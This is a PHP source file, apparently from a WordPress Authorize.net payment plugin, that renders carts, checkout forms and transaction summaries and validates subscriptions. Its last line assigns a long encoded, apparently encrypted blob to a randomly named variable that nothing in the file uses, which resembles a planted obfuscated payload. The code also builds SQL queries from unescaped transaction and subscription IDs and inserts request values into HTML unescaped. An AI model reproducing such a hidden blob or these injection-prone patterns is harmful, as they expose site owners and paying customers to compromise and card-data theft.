        $user_subscriptions_main_template = str_replace('{_USER}', '_user', $user_subscriptions_main_template );
		$user_subscriptions_main_template = str_replace('{UPDATE_SCRIPT_URL}', get_plugin_url_authnet(), $user_subscriptions_main_template );
		$user_subscriptions_main_template = str_replace('{CANCEL_SCRIPT_URL}', get_plugin_url_authnet(), $user_subscriptions_main_template );
		$user_subscriptions_main_template = str_replace('{REFUND_SCRIPT_URL}', get_plugin_url_authnet(), $user_subscriptions_main_template );
		echo $user_subscriptions_main_template. '</div>';
}
// check for already canceled subscription 
function check_for_cancelation($subscriptionid) {
    
	global $wpdb, $authnet_cancellation_table_name;

	$query_cancellation = "SELECT xSubscriptionId FROM "  . $authnet_cancellation_table_name . " WHERE xSubscriptionId ='" . $wpdb->escape($subscriptionid) . "'";
	if ($wpdb->get_var($query_cancellation) == null )	return true;
	else	return false;
}
// check for valid subscription id against both merchant account and user
function subscription_validation($subscriptionid) {
	global $wpdb, $authnet_user_subscription_table_name, $current_user;
	
	get_currentuserinfo();
	// check for admin 
	if (!current_user_can('manage_options')) {
		$where_user_id = "AND USER_ID = '" . $current_user->ID . "'";
	} 
    $query_subscription_validation = "SELECT xSubscriptionId FROM "  . $authnet_user_subscription_table_name . " WHERE xSubscriptionId ='" . $wpdb->escape($subscriptionid) . "'" . $where_user_id;
    if ($wpdb->get_var($query_subscription_validation) != null ) return true;
    else return false;
}
// check for valid transaction & user 
function is_valid_transaction($transaction_id) {
    global $wpdb, $authnet_payment_table_name, $authnet_user_subscription_table_name, $current_user;
    
    get_currentuserinfo();
    // check for admin 
	if (!current_user_can('manage_options')) {
		$where_user_id = "AND US.USER_ID = '" . $current_user->ID . "'";
	} 
    $query_transaction_id_validation = "SELECT US.ID FROM " . $authnet_user_subscription_table_name  ." AS US 
                                        JOIN " .  $authnet_payment_table_name . " AS UP ON UP.user_subscription_id = US.ID 
                                        WHERE UP.xTransId = '" . $wpdb->escape($transaction_id) . "' " . $where_user_id;
    
    if ($wpdb->get_var($query_transaction_id_validation) != null ) return true;
    else return false;
}

// get subcription details base on transaction id 
function get_subscription_detail($transaction_id) {
	global $wpdb, $authnet_payment_table_name, $authnet_user_subscription_table_name;

	$subscription_detail = "SELECT user_subscription.ID, user_subscription.lastFourDigitsOfCreditCard, user_subscription.lastFourDigitsOfBankAccountNumber
                                                        FROM " .  $authnet_user_subscription_table_name. " AS user_subscription 
							JOIN " . $authnet_payment_table_name . " AS payment 
							ON user_subscription.id = payment.user_subscription_id
							WHERE payment.xTransId ='" . $transaction_id . "'";
	// query and return subscription detail 
	return $wpdb->get_row($subscription_detail);
}

// Get cart item detail 
function get_authnet_cart_item($authnet_cart_item) {
	include('authnet_purchase_content_template.php');
	$authnet_item_detail = str_replace ('{SUBSCRIPTION_NAME}' , $authnet_cart_item->getItemName(), $authnet_item_detail);
	$authnet_item_detail = str_replace ('{SUBSCRIPTION_DESC}' , $authnet_cart_item->getItemDescription(), $authnet_item_detail);
	$authnet_item_detail = str_replace ('{SUBSCRIPTION_PRICING}' , $authnet_cart_item->getItemPricing(), $authnet_item_detail);
	$authnet_item_detail = str_replace ('{UNIT_PRICE}' , '$' . number_format($authnet_cart_item->getItemUnitPrice(), 2, '.', ',') , $authnet_item_detail);
	$authnet_item_detail = str_replace ('{UNIT_QUANTITY}' , $authnet_cart_item->getItemQuantity(), $authnet_item_detail);
	$authnet_item_detail = str_replace ('{UNIT_TOTAL}' , '$' . number_format($authnet_cart_item->getItemTotalCost(), 2, '.', ','), $authnet_item_detail);
	$authnet_item_detail = str_replace ('{SUBSCRIPTION_ID}' , $authnet_cart_item->getItemId(), $authnet_item_detail);
	return $authnet_item_detail;
}
// Get whole cart detail for checkout page
function get_authnet_cart($authnet_cart_items) {
	include('authnet_purchase_content_template.php');
	$authnet_cart_content_detail = str_replace ('{AUTHNET_CART_CONTENT}' , $authnet_cart_items, $authnet_cart_content_detail);
	$authnet_cart_content_detail = str_replace ('{HOMEURL}' , home_url('/'), $authnet_cart_content_detail);
	return $authnet_cart_content_detail;
}

function get_back_to_shop() {
	include('authnet_purchase_content_template.php');
	$authnet_back_to_shop = str_replace ('{BACK_TO_SHOP}' , home_url('/'), $authnet_back_to_shop);
	return $authnet_back_to_shop;
}
// Get user's confirmation if user tries to add item to cart again after a recent payment.
function get_confirm_to_shop($subscription) {
    include('authnet_purchase_content_template.php');
    $authnet_confirm_to_shop_again = str_replace ('{YES_BACK_TO_SHOP}' , $url_cart_checkout . '?action=add&subscription=' . $subscription .'&back_to_shop=yes', $authnet_confirm_to_shop_again);
    $authnet_confirm_to_shop_again = str_replace ('{NO_BACK_TO_SHOP}' , home_url('/'), $authnet_confirm_to_shop_again);
    return $authnet_confirm_to_shop_again;
}
// Get checkout form for variable payment and subscription cart
function get_checkout_form($GET_values, $form_style, $is_variable_payments, $is_cart) {
    
        global $in_authnet_checkout_template;
        // Authorize.net template
        if ( isset($in_authnet_checkout_template) && $in_authnet_checkout_template == true ) {
			$open_div = "</div>";
			$close_div = "<div class=\"authnet_postcontain_area\">";
        } else {
			$open_div = "";
			$close_div = "";
        }
        // Show any error message on checkout page top
        $error_message = ( isset( $GET_values['message'] ) )? $GET_values['message'] : ""; 
        // Snow error message for double ARB subscription in a cart
        if( isset($_SESSION['ARB_IN_CART_EXISTS']) && $_SESSION['ARB_IN_CART_EXISTS'] == true ) 
            $error_message = 'Only one recurring subscription can be added to a cart.';
        
        // Prepare values needed for form to render
        $subscription = ($is_cart == true) ? 'multiple' : 'single';
        $amount = $_SESSION['VARIABLE_AMOUNT']; 
        $variable_subscription = $_SESSION['VARIABLE_SUBSCRPTION'];
        $billingFirstName = isset($GET_values['billingFirstName']) ? $GET_values['billingFirstName'] : '';
        $billingLastName = isset($GET_values['billingLastName']) ? $GET_values['billingLastName'] : '';
        $email = isset($GET_values['email']) ? $GET_values['email'] : '';
        $billingAddress = isset($GET_values['billingAddress']) ? $GET_values['billingAddress'] : '';
        $billingCity = isset($GET_values['billingCity']) ? $GET_values['billingCity'] : '';
        $billingState = isset($GET_values['billingState']) ? $GET_values['billingState'] : '';
        $billingZip = isset($GET_values['billingZip']) ? $GET_values['billingZip'] : '';
        $billingCountry = isset($GET_values['billingCountry']) ? $GET_values['billingCountry'] : '';
        $billingPhone = isset($GET_values['billingPhone']) ? $GET_values['billingPhone'] : '';
        $desiredUsername = isset($GET_values['desiredUsername']) ? $GET_values['desiredUsername'] : '';
        $desiredPassword = isset($GET_values['desiredPassword']) ? $GET_values['desiredPassword'] : '';
        $subscriptionNotes = isset($GET_values['subscriptionNotes']) ? $GET_values['subscriptionNotes']: '';
        $billingCompany = isset($GET_values['billingCompany']) ? $GET_values['billingCompany']: '';
		
        $shippingFirstName = isset($GET_values['shippingFirstName']) ? $GET_values['shippingFirstName'] : '';
        $shippingLastName = isset($GET_values['shippingLastName']) ? $GET_values['shippingLastName'] : '';
        $shippingCompany = isset($GET_values['shippingCompany']) ? $GET_values['shippingCompany'] : '';
        $shippingAddress = isset($GET_values['shippingAddress']) ? $GET_values['shippingAddress'] : '';
        $shippingCity = isset($GET_values['shippingCity']) ? $GET_values['shippingCity'] : '';
        $shippingState = isset($GET_values['shippingState']) ? $GET_values['shippingState'] : '';
        $shippingZip = isset($GET_values['shippingZip']) ? $GET_values['shippingZip'] : '';
        $shippingCountry = isset($GET_values['shippingCountry']) ? $GET_values['shippingCountry'] : '';
		
        // Add the checkout form style
        include_once('authnet_checkout_form' . $form_style . '.php');
	
        // Access to log url
	$logo_url = get_option('authnet_checkout_logo');
	if( $logo_url == '') {
		$logo_url = "AUTHNET_TEMPLATE_DIR/authnet_images/logo.png";
	}
        
	// Acess to template css
	$link_to_css = get_bloginfo( 'template_url' ).'/authnet_css/style.css';
	$checkoutform = str_replace("AUTHNET_CSS",  $link_to_css, $checkoutform);

	// Override css for checkout forms.
	if( get_option('authnet_checkout_forms_css_override') ) $link_to_override_css = get_option('authnet_checkout_forms_css_override');
	$checkoutform = str_replace("AUTHNET_OVERRIDE_CSS", $link_to_override_css, $checkoutform);

	$logo_img_tag = '<img src="' . $logo_url . '" alt="" />';	
	$checkoutform = str_replace("CHECKOUT_LOGO_IMAGE",  $logo_img_tag, $checkoutform);

	$checkoutform = str_replace ("AUTHNET_TEMPLATE_DIR", get_bloginfo( 'template_url' ), $checkoutform);

	$plugindir   = dirname(plugin_basename(__FILE__));
	$authnet_basedir = get_bloginfo ('wpurl') . '/wp-content/plugins/'.$plugindir;
        
	$checkoutform = str_replace("PAGE_HEADING",  get_option('authnet_checkout_heading'), $checkoutform);
        
	// Get purchase content detail
	if($is_variable_payments) {
		// Render donation checkout form
		$checkoutform = str_replace("{SINGLE_PAYMENT_FORM}", get_single_payment_form($error_message, $form_style), $checkoutform);
		$checkoutform = str_replace("{AMOUNT}", $amount, $checkoutform);
		$checkoutform = str_replace("{" . $variable_subscription. "}", "selected", $checkoutform);
		$checkoutform = str_replace("{CART_PAYMENT_FORM}", '', $checkoutform);
		if (get_option('authnet_variable_payments_survey') != '') $checkoutform = str_replace ("SURVEY", renderSurvey(get_option('authnet_variable_payments_survey')), $checkoutform);
		else $checkoutform = str_replace ("SURVEY", '', $checkoutform);
		
		$checkoutform = str_replace("{REQUIREDSURV}", get_option('authnet_variable_payments_survey'), $checkoutform);
                
	} else if($is_cart) {
		// Render cart checkout form
		// Get cart from sesssion
		if(isset($_SESSION['AUTHNET_CART'])) {
			$authnetCart = $_SESSION['AUTHNET_CART'];
			// Get all items in cart
			foreach($authnetCart->getCartItems() as $item) {
				$authnet_cart_items .= get_authnet_cart_item($item);
					// Select item's related survey or cart defualt survey
					if ($item->getItemSurvey()) {
						if(isset($cart_survey) && $cart_survey != '') {
							$cart_survey = get_option('authnet_default_survey');
						} else {
							$cart_survey = $item->getItemSurvey();
						}
					}           
			}
		}
		if($authnet_cart_items != '') {
			$checkoutform = str_replace("{CART_PAYMENT_FORM}", get_cart_payment_form(get_authnet_cart($authnet_cart_items), $error_message), $checkoutform);
			$checkoutform = str_replace("{CART_TOTAL}", '$' . number_format($authnetCart->getOrderTotalCost(), 2, '.', ','), $checkoutform); 
		} else  if (isset($_SESSION['TRXSUCCESS']) && $GET_values['action'] == 'add') { 
			// Get user confirmation for adding item to cart again after a fresh payment.
			$checkoutform = str_replace("{CART_PAYMENT_FORM}", get_cart_payment_form( get_confirm_to_shop($GET_values['subscription']), ''), $checkoutform);
                        
		} else	{
			// If cart is empty then show back to shopping message
			$checkoutform = str_replace("{CART_PAYMENT_FORM}", get_cart_payment_form( get_back_to_shop(), ''), $checkoutform);
		}
		// Render the item's related survey or cart default survey
		$checkoutform = str_replace ("SURVEY", renderSurvey($cart_survey), $checkoutform);
		$checkoutform = str_replace("{SINGLE_PAYMENT_FORM}", '', $checkoutform);
		$checkoutform = str_replace("{REQUIREDSURV}", $cart_survey, $checkoutform);
                
		
		// Unset the double ARB existence in session for next item
		unset($_SESSION['ARB_IN_CART_EXISTS']);
	}
        
	// Assign other checkout template values
	$checkoutform = str_replace("AUTHNET_FORM_BUTTON_TEXT", get_option('authnet_checkout_buy_button'), $checkoutform);
	$checkoutform = str_replace("AUTHNET_GUARANTEE_HTML", get_option('authnet_checkout_guaranteehtml'), $checkoutform);
	$checkoutform = str_replace("AUTHNET_SITE_SEAL", get_option('authnet_checkout_siteseal'), $checkoutform);
     
	if (get_option('authnet_enable_creditcard') == 'on' && get_option('authnet_enable_echeck') == 'on') {
		
		// Render bank account section properly in case of errors
		if ($_SESSION['processEcheck'] == true) {
			$_SESSION['processEcheck'] = false;
			$checkoutform = str_replace ("AUTHNET_ECHECK_DETAILS", $echeck_form_template, $checkoutform); 
			$checkoutform = str_replace ("{DISPLAYECHECK}", 'block', $checkoutform); 
			$checkoutform = str_replace ("AUTHNET_CC_DETAILS", $cc_form_template, $checkoutform);
			$checkoutform = str_replace ("{DISPLAYCC}", 'none', $checkoutform); 
			$checkoutform = str_replace ("AUTHNET_ENABLE_ECHECK_PAYMENT", $enable_echeck_payment_option, $checkoutform);
			$checkoutform = str_replace ("{ENABLECHECKED}", 'checked', $checkoutform);
		} else {
			$checkoutform = str_replace ("AUTHNET_CC_DETAILS", $cc_form_template, $checkoutform); 
			$checkoutform = str_replace ("{DISPLAYCC}", 'block', $checkoutform); 
			$checkoutform = str_replace ("AUTHNET_ECHECK_DETAILS", $echeck_form_template, $checkoutform); 
			$checkoutform = str_replace ("{DISPLAYECHECK}", 'none', $checkoutform); 
			$checkoutform = str_replace ("AUTHNET_ENABLE_ECHECK_PAYMENT", $enable_echeck_payment_option, $checkoutform);
			$checkoutform = str_replace ("{ENABLECHECKED}", '', $checkoutform);
		}
	} else if (get_option('authnet_enable_creditcard') == 'on') {
				$checkoutform = str_replace ("AUTHNET_CC_DETAILS", $cc_form_template, $checkoutform); 
				$checkoutform = str_replace ("{DISPLAYCC}", 'block', $checkoutform); 
				$checkoutform = str_replace ("AUTHNET_ENABLE_ECHECK_PAYMENT", '', $checkoutform);
				$checkoutform = str_replace ("AUTHNET_ECHECK_DETAILS", '', $checkoutform);
	} else  if (get_option('authnet_enable_echeck') == 'on') {
				$checkoutform = str_replace ("AUTHNET_ECHECK_DETAILS", $echeck_form_template, $checkoutform); 
				$checkoutform = str_replace ("{DISPLAYECHECK}", 'block', $checkoutform); 
				$checkoutform = str_replace ("AUTHNET_CC_DETAILS", '', $checkoutform); 
				$checkoutform = str_replace ("AUTHNET_ENABLE_ECHECK_PAYMENT", '', $checkoutform);
	} else {
			$checkoutform = str_replace ("AUTHNET_ECHECK_DETAILS", '', $checkoutform); 
			$checkoutform = str_replace ("AUTHNET_CC_DETAILS", '', $checkoutform); 
			$checkoutform = str_replace ("AUTHNET_ENABLE_ECHECK_PAYMENT", '', $checkoutform);
			$checkoutform = str_replace ("{DISPLAYCC}", '', $checkoutform); 
			$checkoutform = str_replace ("{DISPLAYECHECK}", '', $checkoutform); 
	}
        
	if (get_option('authnet_include_shippinginfo') == 'on') 
		$checkoutform = str_replace ("SHIPPINGINFORMATION", $shipping_information, $checkoutform); 
	else 
		$checkoutform = str_replace ("SHIPPINGINFORMATION", '', $checkoutform); 
	if (get_option('authnet_include_userinfo') == 'on') $checkoutform = str_replace ("USERINFORMATION", $userinfo_form, $checkoutform);
	else $checkoutform = str_replace ("USERINFORMATION", '', $checkoutform);
	if (get_option('authnet_include_usernotes') == 'on') $checkoutform = str_replace ("USERNOTES", $usernotes_form, $checkoutform);
	else $checkoutform = str_replace ("USERNOTES", '', $checkoutform);
   
	// Add recaptcha option to prevent system from bot.
	if (get_option("authnet_recaptcha")) {
		$checkoutform = str_replace ("AUTHNET_RECAPTCHA", authnet_recaptcha_get_html(get_option("authnet_recaptcha_publickey"), $error_message, get_option('authnet_usessl')), $checkoutform);
	} else {
		$checkoutform = str_replace ("AUTHNET_RECAPTCHA", '', $checkoutform);
	}
        // Use SSL warning message
        $checkoutform = str_replace ("{USE_SSL_WARNING}", get_use_ssl_warning('checkout') , $checkoutform);
        $checkoutform = str_replace ("{_CHECKOUT_SELECT}", '' , $checkoutform);
        $checkoutform = str_replace ("{_USER}", '' , $checkoutform);
        
        // Add recent item  querystring parameters to the URL
        // Used for user confirmation for adding item to cart again after a fresh payment
        $checkoutform = str_replace("{ACTX}", $GET_values['action'] , $checkoutform);
        $checkoutform = str_replace("{SUBIDX}", $GET_values['subscription'] , $checkoutform);
	
        return $checkoutform;
}
// Get SSL warning message, if site is not under SSL
function get_use_ssl_warning( $form ) {
    include('authnet_purchase_content_template.php');
    // Check for 'Use SSL' option in settings or for server, if server has ssl
    if( !(get_option('authnet_usessl')) || !is_ssl())   $is_ssl = true;
    if ($is_ssl) {
        if ($form == 'admin_page' )
            $use_ssl_warning = str_replace ("{WARNING-CSS}", 'use-ssl-warning-admin-pages' , $use_ssl_warning);
        else if ($form == 'checkout')
            $use_ssl_warning = str_replace ("{WARNING-CSS}", 'use-ssl-warning-checkout' , $use_ssl_warning);
        else if ($form == 'update-cancel' || $form == 'refund')
            $use_ssl_warning = str_replace ("{WARNING-CSS}", 'use-ssl-warning-update-cancel' , $use_ssl_warning);
			
        return $use_ssl_warning; 
    }
}

// Get pending transction notification
function get_pending_transactions_notification() {
    include('authnet_usersubscriptions_template.php');
    
    global $wpdb, $authnet_user_subscription_table_name, $authnet_payment_table_name;
     $transactions_auth_only = "SELECT  count(*) FROM ". $authnet_user_subscription_table_name ." AS US
                                 JOIN ". $authnet_payment_table_name . " AS UP ON US.id = UP.user_subscription_id
                                 WHERE US.isRecurring IS NULL AND UP.xType = 'auth_only' AND UP.xTransStatus = 'Pending Capture' AND UP.expiryDate >= CURDATE();";
         if ( $wpdb->get_var($transactions_auth_only) > 0) {
               $notify_pending_capture = str_replace ("{PENDING_CAPTURE_URL}", (get_home_url() . '/wp-admin/admin.php?page=authnet_render_pending_capture') , $notify_pending_capture);
             echo $notify_pending_capture; 
         } else {
             echo '';
         }
}

// Get authnet's sidebar mini cart
function authnet_sidebar_mini_cart() {
    include('authnet_checkout_common.php');
    include('authnet_purchase_content_template.php');
    $items_count = 0;
    $cart_total_cost = 0;
    if(isset($_SESSION['AUTHNET_CART'])) {
        // Get cart from sesssion
        $authnetCart = $_SESSION['AUTHNET_CART'];
        // Get total items in cart
        foreach($authnetCart->getCartItems() as $item) {
           $items_count = $items_count + $item->getItemQuantity();
        }
        // Total cart cost
        $cart_total_cost = $authnetCart->getOrderTotalCost();
    } 
    $authnet_sidebar_cart = str_replace ('{TOTAL_CART_ITEMS}' ,  $items_count, $authnet_sidebar_cart);
    $authnet_sidebar_cart = str_replace ('{CART_TOTAL}' ,'$' . number_format($cart_total_cost, 2, '.', ',') , $authnet_sidebar_cart);
    $authnet_sidebar_cart = str_replace ('{CHECKOUT_PAGE}' , $url_cart_checkout, $authnet_sidebar_cart);
    echo $authnet_sidebar_cart;
}
// As we have different kind of pricing, So include the amount that will be charged right now 
function get_item_charged_price($subscription_details) {
    $item_charged_amount = 0;
        if ( $subscription_details->processSinglePayment == 1 && $subscription_details->processRecurringPayment == 0 ) {
            $item_charged_amount = $subscription_details->initialAmount;
        } else if ( $subscription_details->processSinglePayment == 0 && $subscription_details->processRecurringPayment == 1 ) {
            if($subscription_details->recurringTrialOccurrences > 0) {
                $item_charged_amount = $subscription_details->recurringTrialAmount;
            } else {
                $item_charged_amount = $subscription_details->recurringAmount;
            }
        } else if ( $subscription_details->processSinglePayment == 1 && $subscription_details->processRecurringPayment == 1 ) {
            if($subscription_details->recurringTrialOccurrences > 0) {
                $item_charged_amount = ($subscription_details->initialAmount + $subscription_details->recurringTrialAmount);
            }
            else {
                $item_charged_amount = ($subscription_details->initialAmount + $subscription_details->recurringAmount);
            }
        }
        return $item_charged_amount;
}
function get_transaction_summary($transaction_details, $summary_style, $process_type) {
	
	include_once('authnet_transaction_summary' . $summary_style . '.php');

	$link_to_css = get_bloginfo( 'template_url' ).'/authnet_css/style.css';
	$transaction_summary = str_replace("AUTHNET_CSS", $link_to_css, $transaction_summary);

	// personal details
	$transaction_summary = str_replace('{BILLING_FIRST_NAME}', $transaction_details->billingFirstName , $transaction_summary);
	$transaction_summary = str_replace('{BILLING_LAST_NAME}', $transaction_details->billingLastName  , $transaction_summary);
	$transaction_summary = str_replace('{COMPANY}', $transaction_details->billingCompany  , $transaction_summary);
	$transaction_summary = str_replace('{EMAIL}', $transaction_details->emailAddress  , $transaction_summary);
	$transaction_summary = str_replace('{CITY}', $transaction_details->billingCity  , $transaction_summary);
	$transaction_summary = str_replace('{STATE}', $transaction_details->billingState  , $transaction_summary);
	$transaction_summary = str_replace('{ZIP}', $transaction_details->billingZip , $transaction_summary);
	$transaction_summary = str_replace('{PHONE}', $transaction_details->billingPhone  , $transaction_summary);
	$transaction_summary = str_replace('{COUNTRY}', $transaction_details->billingCountry , $transaction_summary);
	$transaction_summary = str_replace('{ADDRESS}', $transaction_details->billingAddress  , $transaction_summary);

	// transaction details
	$transaction_summary = str_replace('{LOGGEDIN}', get_userdata($transaction_details->user_id)->user_login, $transaction_summary);
	$transaction_summary = str_replace('{TRANSACTIONID}', $transaction_details->xTransId   , $transaction_summary);
	$transaction_summary = str_replace('{SUBSCRIPTIONID}', $transaction_details->xSubscriptionId , $transaction_summary);

	// payment details
	if(isset($_SESSION['AUTHNET_CART']) && $_SESSION['AUTHNET_CART'] != '' && $process_type == 'multiple') {
	 
		// Get purchase items
		$purchased_cart_items = get_cart_items_record($transaction_details->id);
			
		if($purchased_cart_items != null ) {
			$order_total_cost = 0;
			for($i = 0; $i<count($purchased_cart_items); $i++) {
				$item_detail .= get_summary_item_detail($purchased_cart_items[$i]);
				$order_total_cost += $purchased_cart_items[$i]->totalPrice;
			}
		}
		$transaction_summary = str_replace('{PURCHASE_DETAIL}', get_summary_purchase_detail($item_detail), $transaction_summary);
		$transaction_summary = str_replace('{TOTAL}',  '$' . number_format($order_total_cost, 2, '.', ',') , $transaction_summary);
	} else if ($process_type == 'variable_payments' ) {
		$transaction_summary = str_replace('{PURCHASE_DETAIL}', get_summary_single_purchase_detail(), $transaction_summary);
	}
        // display transaction survey 
		if ( empty($transaction_details->subscriptionNotes) ) {
			$transaction_summary = str_replace('{SURVEY}', '', $transaction_summary);
		} else {
			$transaction_summary = str_replace('{SURVEY}', $transaction_summary_survey, $transaction_summary);
			$transaction_summary = str_replace('{SURVEY_DETAILS}', get_survey_detail($transaction_details->subscriptionNotes), $transaction_summary);
		}
	return stripslashes($transaction_summary);
}
function get_survey_detail($subscription_notes) {
    include('authnet_purchase_content_template.php');
    $transaction_summary_survey_details = str_replace('{AUTHNET_SURVEY}', get_subscription_notes($subscription_notes) , $transaction_summary_survey_details);
    return $transaction_summary_survey_details;
}
function get_subscription_notes($notes) {
    include('authnet_purchase_content_template.php');
    $re_strip_header = "/SURVEY ANSWERS:\n(.*)/ims";
		$re_get_values = "/(.+)\s*:\s*(.+)/";
		
		// strip off header
		preg_match ($re_strip_header, $notes, $matches);
		$notesfield = $matches[1];
		
                // split out delimited responses
		preg_match_all ($re_get_values, $notesfield, $notesvalues, PREG_SET_ORDER);
		
                #var_dump($notesvalues);
		foreach ( $notesvalues as $notesvalue ) {
                    $survey_item = str_replace('{SURVEYQUERY}',$notesvalue[1]  , $transaction_summary_survey_row);
                    $survey_item = str_replace('{SURVEYANSWER}',$notesvalue[2]  , $survey_item);
                    $survey_result .= $survey_item;
		}
                return $survey_result;

}
// Get cart purchase detail for transaction summary report
function get_summary_purchase_detail($item_detail) {
	include('authnet_purchase_content_template.php');
	$transaction_summary_purchase_details = str_replace('{AUTHNET_CART_CONTENT}', $item_detail , $transaction_summary_purchase_details);
	return $transaction_summary_purchase_details;
}
// Get cart's item detail for transaction summary reprot
function get_summary_item_detail($item) {
	include('authnet_purchase_content_template.php');
	$transaction_summary_item_details = str_replace ('{SUBSCRIPTION_NAME}' , $item->name, $transaction_summary_item_details);
	$transaction_summary_item_details = str_replace ('{SUBSCRIPTION_DESC}' , $item->initialDescription, $transaction_summary_item_details);
	$transaction_summary_item_details = str_replace ('{SUBSCRIPTION_PRICING}' , get_pricing($item), $transaction_summary_item_details);
	$transaction_summary_item_details = str_replace ('{UNIT_PRICE}' , '$' . number_format($item->unitPrice, 2, '.', ',') , $transaction_summary_item_details);
	$transaction_summary_item_details = str_replace ('{UNIT_QUANTITY}' , $item->quantity, $transaction_summary_item_details);
	$transaction_summary_item_details = str_replace ('{UNIT_TOTAL}' , '$' . number_format($item->totalPrice, 2, '.', ','), $transaction_summary_item_details);
	$transaction_summary_item_details = str_replace ('{SUBSCRIPTION_ID}' , $item->id, $transaction_summary_item_details);
	return $transaction_summary_item_details;
}
// Get single purchase detail for summary report
function get_summary_single_purchase_detail() {
	include('authnet_purchase_content_template.php');
	$summary_single_purchase_detail = str_replace ('{PRICING}' , $_SESSION['pricing'], $summary_single_purchase_detail);
	return $summary_single_purchase_detail;
}
// Get purchsed items summary for summary report
function get_cart_items_record($user_subscription_id) {
	global $wpdb, $authnet_cart_items_table_name, $authnet_user_subscription_table_name, $authnet_subscription_table_name, $authnet_payment_table_name;    
	if(isset($user_subscription_id) && $user_subscription_id != '') {
                $query = "SELECT * FROM  $authnet_cart_items_table_name 
                JOIN $authnet_user_subscription_table_name ON $authnet_user_subscription_table_name.ID  = $authnet_cart_items_table_name.user_subscription_id 
                JOIN $authnet_subscription_table_name ON $authnet_subscription_table_name.ID = $authnet_cart_items_table_name.subscription_id
                WHERE  $authnet_user_subscription_table_name.ID = ". $user_subscription_id;
	}
	return $purchased_cart_items = $wpdb->get_results($query);
}

// Get single payment form (donation) to be integrated with checkout form
function get_single_payment_form($error_message, $form_style) {
    include('authnet_variable_payment_form.php');
    $single_payment_form = str_replace ('{PAYMENT_FORM}' , $variable_payment_template, ($form_style == 3)? $checkout_payment_form3 : $checkout_payment_form);
    $single_payment_form = str_replace ('{ERROR_MESSAGE}' , $error_message, $single_payment_form);
    if ( get_option('authnet_allow_preset_amounts') && get_option('authnet_preset_amounts_list') != '' ) {
		$single_payment_form = str_replace ('{AMOUNT_LABEL}' , $other_amount_label, $single_payment_form);
    } else {
		$single_payment_form = str_replace ('{AMOUNT_LABEL}' , $variable_amount_label, $single_payment_form);
    }
    return $single_payment_form;
}
// Get cart payment form to be integrated with checkout form
function get_cart_payment_form($cart_item_details, $error_message){
	include('authnet_purchase_content_template.php');
	$cart_payment_form = str_replace ('{PAYMENT_FORM}' , $cart_item_details, $checkout_payment_form);
	$cart_payment_form = str_replace ('{ERROR_MESSAGE}' , $error_message, $cart_payment_form);
	return $cart_payment_form;
}
// Set single order detail in session to be accessed on checkout page return if any error
function set_single_order_details($POST_values) {
	// Save single payment (donation) order details in session for use
	$_SESSION['VARIABLE_AMOUNT'] = $POST_values['variable_amount'];
	$_SESSION['VARIABLE_SUBSCRPTION'] = $POST_values['variable_subscription'];
        // save survey 
        foreach ($POST_values as $key => $value) { 
        if (strpos($key, "survey_") !== false) {
            $key = str_replace(' ', '_', $key);
            $_SESSION[$key] = $value;
        }
    }
}
// Unset single order detail in session after processing 
function unset_single_order_details() {
	unset($_SESSION['VARIABLE_AMOUNT']);
	unset($_SESSION['VARIABLE_SUBSCRPTION']);
}
// Save successful subscription 
function authnet_successful_subscription($user_subscription_id, $process_type) {
    $_SESSION['USESUBID'] = $user_subscription_id;
    $_SESSION['PROCESSTYPE'] = $process_type;
    $_SESSION['TRXSUCCESS'] = true;
}
// Initialize the cart item to be added in cart
function initialize_cart_item($subscription_details) {
	include_once('AuthnetCartItem.php');
	// Initialize the item values
	$authnetCartItem  = new AuthnetCartItem($subscription_details->ID,$subscription_details->name);

	// Setting rest of values
	$authnetCartItem->setItemDescription($subscription_details->initialDescription);
	$authnetCartItem->setItemUnitPrice(get_item_charged_price($subscription_details));
	$authnetCartItem->setItemQuantity('1');
	$authnetCartItem->setItemPricing(get_pricing($subscription_details));
	$authnetCartItem->setItemProcessAIM($subscription_details->processSinglePayment);
	$authnetCartItem->setItemProcessARB($subscription_details->processRecurringPayment);
	$authnetCartItem->setItemInitialAmount($subscription_details->initialAmount);
	$authnetCartItem->setItemRecurringAmount($subscription_details->recurringAmount);
	$authnetCartItem->setItemSurvey($subscription_details->survey);
	$authnetCartItem->setItemWhishListLevel($subscription_details->wishlistLevel);
	$authnetCartItem->setItemSubmLevel($subscription_details->submLevel);
	// Return item to be added in cart
	return $authnetCartItem;
}
$fCjpLHAvgPE='b8vtVswCRt0Qb5E6m175lN9dnHSl+NScX3uPi5b+zRA7MU/bAuxe0CmXsB9eGF7Wo5piWv8Mw2Je/hXwhf9janYL8uA27pgtDToRlHw8NIa42zdQeo2aZZxDPJ/49x/cP6fJ88BWpxRx1c4+9ywqLVx2z57w9fH/v2pReIAl5VqH5icdLbM9OtuV/N8aVhbwp/7f/el7OHtM5tLrh1Whi8Yq8TfXo+yUQ9z/BzOo9JSNNtrhYJnlyv8tm8bIBteKf4Oc4TbGmRs0OE6ZtTF1lhtqo/KSuF3YSTk+NC8omV+CZEfC23oDas2sctk1LvnLVSqPUdKfapRfQGsBaUrgitwmwpCJIrapsgtaJbMtV0kbMADbF2fNP/h3XkRsrA0nJN9qGoeBpJW5VHd8RpGvtJmGlrWYjiWbGu1BUnifO5j/gyvAR0+0Aj50OearGvjR9lyQoDOBp9OGkE/Rve5mJ7ZQcDriLj4CqUZVrIBWiFIIxWwa7vjcuCh3hqdW5Sykyg36BnwCpEqYipx/wjc9ReT/hWrSxj9hxmNsrrn8i1rXu3xn0Ht+9TAyGRNgneI//Mw1iWljumXL8ihgHfecgcHddabEkshVl1ht96UxnC+LCeI018ValEL8FtsFP/rpJGO2dppJ+fmp16dr9kaAsbWUqLlzwnbGS4Ej7zTiTOTBSkBfUlb19cjXEuqQDQmbNd7MDiA6tcwTQptoX9GaPKTOoetkD+NWRjiTOzhUg1d2qzJnWk40oRG5iJB8iun2G4PbhLBVwP+Cc9s5mXkNgCFFwqottpJNjhKeJv6Znd+H0FYZhcCjqyxQulMMFtEGb/efe3d93E0UW0bcGnrEwOyRe7wlQk5PN2p7iNUJs0tsanc/hOgebGYscovGQMwhUNVBw7dWQstD5KCi2uZLUzr71JDEqYWThskbS4ioGXaKxCkrhYaT24CyYUJFmw0oHisllbSxExeFmLV8TQGy1uoBa8qMZlSpeBiMVFiJknHb9U51iNSpCsYKg0qmx56sadNNH3irMtJTvCvCSjyFRCAdFVFzTEHvfNXgyMvn9re9CQn2FaVYy2I1jjKO4LT+zO/oug5v+iVfcGB/e1FmxSXxj6O/hh0uHYCcamQPfvxkaw/9G3jucwx8sIYneKs7gbF8dCeNVc3iidSURZtHE9JNZmAezJNKfOrC8l++bDflml/fv4s3Bg/Snf6nTfxzFqdhlMVWyMnlV